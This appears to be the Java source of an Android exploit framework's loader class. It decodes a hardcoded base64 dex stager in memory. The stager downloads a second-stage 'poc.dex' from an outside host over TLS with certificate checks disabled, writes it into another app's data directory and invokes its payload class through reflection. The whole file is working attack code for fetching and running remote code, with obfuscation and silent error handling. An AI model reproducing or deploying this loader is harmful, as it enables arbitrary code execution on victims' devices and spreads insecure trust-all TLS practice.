package com.wrlus.expfwk;

import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.X509TrustManager;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.nio.ByteBuffer;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Base64;

public class Loader {
    // Step 2: load dex from Internet and load
    public static void load(String filePath, String param) {
        new Thread(new Runnable() {
            @Override
            public void run() {
                String realFilePath = "poc.dex";
                if (filePath != null)
                    realFilePath = filePath;
                try {
                    SSLContext sslContext = SSLContext.getInstance("SSL");
                    X509TrustManager[] trustManagers = { new UnsecureX509TrustManager() };
                    sslContext.init(null, trustManagers, new SecureRandom());
                    SSLSocketFactory sslSocketFactory = sslContext.getSocketFactory();
                    HttpsURLConnection conn = (HttpsURLConnection) new URL("https://sec.wrlu.cn/poc.dex").openConnection();
                    conn.setUseCaches(false);
                    conn.setRequestMethod("GET");
                    conn.setSSLSocketFactory(sslSocketFactory);
                    conn.connect();
                    InputStream is = conn.getInputStream();
                    FileOutputStream fos = new FileOutputStream(realFilePath);
                    byte[] buffer = new byte[1024];
                    int size;
                    while ((size = is.read(buffer)) != -1) {
                        fos.write(buffer, 0, size);
                    }
                    is.close();
                    fos.close();

                    realLoad(filePath, param);
                } catch (Exception ignored) {}
            }
        }).start();
    }

    public static void realLoad(String filePath, String param) {
        try {
            Object dexClassLoaderObj = Class.forName("dalvik.system.DexClassLoader")
                    .getDeclaredConstructor(String.class, String.class, String.class, ClassLoader.class)
                    .newInstance(filePath, null, null, Object.class.getClassLoader());
            Method findClassMethod = Class.forName("dalvik.system.BaseDexClassLoader")
                    .getDeclaredMethod("findClass", String.class);
            findClassMethod.setAccessible(true);
            Class<?> dexTaskClass = (Class<?>) findClassMethod.invoke(dexClassLoaderObj, "com.wrlus.expfwk.cmd.control.DexTask");
            dexTaskClass.getDeclaredMethod("directCall", String.class).invoke(null, param);
        } catch (Exception e) {
            e.printStackTrace();
            Object a = new Object();
            loadMemoryDex(a.toString());
        }
    }

//     Step 1: load hardcode dex to download next dex
    public static void loadMemoryDex(String param) {
        String dex = "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ZXRob2Q7AB5MZGFsdmlrL2Fubm90YXRpb24vSW5uZXJDbGFzczsAIUxkYWx2aWsvYW5ub3RhdGlvbi9NZW1iZXJDbGFzc2VzOwAdTGRhbHZpay9hbm5vdGF0aW9uL1NpZ25hdHVyZTsAGkxkYWx2aWsvYW5ub3RhdGlvbi9UaHJvd3M7ABpMamF2YS9pby9GaWxlT3V0cHV0U3RyZWFtOwAVTGphdmEvaW8vSW5wdXRTdHJlYW07ABFMamF2YS9sYW5nL0NsYXNzOwAUTGphdmEvbGFuZy9DbGFzczwqPjsAF0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7ABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsAEkxqYXZhL2xhbmcvT2JqZWN0OwAUTGphdmEvbGFuZy9SdW5uYWJsZTsAEkxqYXZhL2xhbmcvU3RyaW5nOwASTGphdmEvbGFuZy9UaHJlYWQ7AB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7ABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwAOTGphdmEvbmV0L1VSTDsAGExqYXZhL25ldC9VUkxDb25uZWN0aW9uOwAcTGphdmEvc2VjdXJpdHkvU2VjdXJlUmFuZG9tOwApTGphdmEvc2VjdXJpdHkvY2VydC9DZXJ0aWZpY2F0ZUV4Y2VwdGlvbjsAIkxqYXZheC9uZXQvc3NsL0h0dHBzVVJMQ29ubmVjdGlvbjsAGkxqYXZheC9uZXQvc3NsL1NTTENvbnRleHQ7ACBMamF2YXgvbmV0L3NzbC9TU0xTb2NrZXRGYWN0b3J5OwAgTGphdmF4L25ldC9zc2wvWDUwOVRydXN0TWFuYWdlcjsAC0xvYWRlci5qYXZhAAlNYWluLmphdmEAA1NTTAAYVW5zZWN1cmVYNTA5VHJ1c3RNYW5hZ2VyAAFWAAJWTAAEVkxJSQADVkxMAARWTExMAAJWWgABWgACW0IAEltMamF2YS9sYW5nL0NsYXNzOwATW0xqYXZhL2xhbmcvT2JqZWN0OwATW0xqYXZhL2xhbmcvU3RyaW5nOwAlW0xqYXZhL3NlY3VyaXR5L2NlcnQvWDUwOUNlcnRpZmljYXRlOwAbW0xqYXZheC9uZXQvc3NsL0tleU1hbmFnZXI7AB1bTGphdmF4L25ldC9zc2wvVHJ1c3RNYW5hZ2VyOwAhW0xqYXZheC9uZXQvc3NsL1g1MDlUcnVzdE1hbmFnZXI7AAthY2Nlc3NGbGFncwAEYXJncwAIYXV0aFR5cGUABmJ1ZmZlcgAFY2hhaW4AEmNoZWNrQ2xpZW50VHJ1c3RlZAASY2hlY2tTZXJ2ZXJUcnVzdGVkAAVjbG9zZQAkY29tLndybHVzLmV4cGZ3ay5jbWQuY29udHJvbC5EZXhUYXNrAARjb25uAAdjb25uZWN0ACBkYWx2aWsuc3lzdGVtLkJhc2VEZXhDbGFzc0xvYWRlcgAcZGFsdmlrLnN5c3RlbS5EZXhDbGFzc0xvYWRlcgARZGV4Q2xhc3NMb2FkZXJPYmoADGRleFRhc2tDbGFzcwAKZGlyZWN0Q2FsbAABZQAIZmlsZVBhdGgACWZpbmRDbGFzcwAPZmluZENsYXNzTWV0aG9kAAdmb3JOYW1lAANmb3MAEmdldEFjY2VwdGVkSXNzdWVycwAOZ2V0Q2xhc3NMb2FkZXIAFmdldERlY2xhcmVkQ29uc3RydWN0b3IAEWdldERlY2xhcmVkTWV0aG9kAA5nZXRJbnB1dFN0cmVhbQALZ2V0SW5zdGFuY2UAEGdldFNvY2tldEZhY3RvcnkAG2h0dHBzOi8vc2VjLndybHUuY24vcG9jLmRleAAEaW5pdAAGaW52b2tlAAJpcwAEbG9hZAAEbWFpbgAEbmFtZQALbmV3SW5zdGFuY2UADm9wZW5Db25uZWN0aW9uAAVwYXJhbQAHcG9jLmRleAAPcHJpbnRTdGFja1RyYWNlAARyZWFkAAxyZWFsRmlsZVBhdGgACHJlYWxMb2FkAANydW4ADXNldEFjY2Vzc2libGUAEHNldFJlcXVlc3RNZXRob2QAE3NldFNTTFNvY2tldEZhY3RvcnkADHNldFVzZUNhY2hlcwAEc2l6ZQAKc3NsQ29udGV4dAAQc3NsU29ja2V0RmFjdG9yeQAFc3RhcnQABHRlc3QABHRoaXMADXRydXN0TWFuYWdlcnMADHZhbCRmaWxlUGF0aAAJdmFsJHBhcmFtAAV2YWx1ZQAFd3JpdGUABAAHDgAGATwHDngAFAIAAAcOABcABw4tAwRlE0suaQMGbRy0AwhyKJZLAwduHdIDAUQbS1o8PEsDA1sNWgMCUAxMAwA+IQEEAwVsATxfBQAFAQUCBQMFBQUGBQcFCB4Cex0GAAYBBgIGAwYFBgYGBwYIPD0AVgAHDgBbAj89Bw4AYAI/PQcOAGQABw4AEQAHDgAUAkxhBw4CHaQ8ADYCTGEHDgEdDwEVD6UDAEgR/0sDA04WS+EEAUkOFwEYFAUABQEFAwJ7HR4DAksQAAIGAXQaCQIHAjoEAF0eAgkBdBwBFwACBQF0GAQCBwI6BAhdFyoCCgF0HAEYGQIIAXQcARgDAAACAACBgATgCwEJ+AsAAgEBAJAgAZAgAoCABJgMAwG4DAAAAQMEgIAErA4FAcQOAQHYDgEB7A4AAAMACIGABIQPAQmcDwEJyA8AABAAAAAAAAAAAQAAAAAAAAABAAAAdgAAAHAAAAACAAAAKAAAAEgCAAADAAAAFgAAAOgCAAAEAAAAAgAAAPADAAAFAAAAJgAAAAAEAAAGAAAABAAAADAFAAADEAAABQAAALAFAAABIAAACwAAAOAFAAAGIAAAAwAAAOQIAAABEAAADwAAACwJAAACIAAAdgAAAKoJAAADIAAACwAAAEYRAAAEIAAABwAAABMSAAAAIAAABAAAAEgSAAAAEAAAAQAAAJQSAAA=";
        try {
            Object dexClassLoaderObj = Class.forName("dalvik.system.InMemoryDexClassLoader")
                    .getDeclaredConstructor(ByteBuffer.class, ClassLoader.class)
                    .newInstance(ByteBuffer.wrap(Base64.getDecoder().decode(dex)), Object.class.getClassLoader());
            Method findClassMethod = Class.forName("dalvik.system.BaseDexClassLoader")
                    .getDeclaredMethod("findClass", String.class);
            findClassMethod.setAccessible(true);
            Class<?> dexTaskClass = (Class<?>) findClassMethod.invoke(dexClassLoaderObj, "com.wrlus.expfwk.Loader");
            dexTaskClass.getDeclaredMethod("load", String.class, String.class).invoke(null, "/data/data/com.baidu.input/poc.dex", param);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static class UnsecureX509TrustManager implements X509TrustManager {

        @Override
        public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException {

        }

        @Override
        public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {

        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return new X509Certificate[0];
        }
    }
}
